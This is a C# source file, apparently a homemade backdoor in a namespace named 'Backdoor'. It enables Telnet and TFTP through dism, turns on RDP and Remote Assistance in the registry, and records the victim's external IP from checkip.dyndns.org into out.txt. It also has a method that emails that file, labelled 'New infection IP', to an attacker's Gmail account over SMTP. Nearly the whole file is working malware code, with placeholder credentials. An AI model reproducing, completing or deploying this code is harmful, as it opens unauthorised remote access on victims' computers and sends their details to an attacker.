using System;
using System.Diagnostics;
using System.IO;
using System.Net.Mail;

namespace Backdoor
{
    class backdoor
    {
        static void Main()
        {
            // Enabling telnet client and server on remote machine
            ExecuteCommand("dism /online /Enable-Feature /FeatureName:TelnetClient");
            ExecuteCommand("dism /online /Enable-Feature /FeatureName:TFTP");

            // Enable RDP and Remote Assistance on remote machine via Registry
            Microsoft.Win32.RegistryKey key;
            key = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Server");
            key.SetValue("fDenyTSConnections", "0");
            key = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Server");
            key.SetValue("fAllowToGetHelp", "1");
            key.Close();

            // Outputing all text in console to out.txt in local directory
            var filestream = new FileStream("out.txt", FileMode.Create);
            var streamwriter = new StreamWriter(filestream)
            {
                AutoFlush = true
            };
            Console.SetOut(streamwriter);
            Console.SetError(streamwriter);

            // Getting ExternalIP
            var url = "http://checkip.dyndns.org";
            var req = System.Net.WebRequest.Create(url);
            var resp = req.GetResponse();
            using (var sr = new System.IO.StreamReader(resp.GetResponseStream()))
            {
                var response = sr.ReadToEnd().Trim();
                var a = response.Split(':');
                var a2 = a[1].Substring(1);
                var a3 = a2.Split('<');
                var a4 = a3[0];
                Console.WriteLine(a4);
            }
        }

        static void ExecuteCommand(string command)
        {
            int exitCode;
            ProcessStartInfo processInfo;
            Process process;

            processInfo = new ProcessStartInfo("cmd.exe", "/c " + command)
            {
                CreateNoWindow = true,
                UseShellExecute = false,
                // *** Redirect the output ***
                RedirectStandardError = true,
                RedirectStandardOutput = true
            };

            process = Process.Start(processInfo);
            process.WaitForExit();

            // *** Read the streams ***
            // Warning: This approach can lead to deadlocks, see Edit #2
            var output = process.StandardOutput.ReadToEnd();
            var error = process.StandardError.ReadToEnd();

            exitCode = process.ExitCode;

            Console.WriteLine("output>>" + (String.IsNullOrEmpty(output) ? "(none)" : output));
            Console.WriteLine("error>>" + (String.IsNullOrEmpty(error) ? "(none)" : error));
            Console.WriteLine("ExitCode: " + exitCode.ToString(), nameof(ExecuteCommand));
            process.Close();
        }

        public static void Email_send()
        {
            var mail = new MailMessage();
            using (var SmtpServer = new SmtpClient("smtp.gmail.com"))
            {
                mail.From = new MailAddress("youremail@gmail.com");
                mail.To.Add("youremail@gmail.com");
                mail.Subject = "Backdoor Update";
                mail.Body = "New infection IP is attached below:";

                System.Net.Mail.Attachment attachment;
                attachment = new System.Net.Mail.Attachment("out.txt");
                mail.Attachments.Add(attachment);

                SmtpServer.Port = 587;
                SmtpServer.Credentials = new System.Net.NetworkCredential("youremail@gmail.com", "yourpassword?");
                SmtpServer.EnableSsl = true;

                SmtpServer.Send(mail);
            }

        }

    }
}
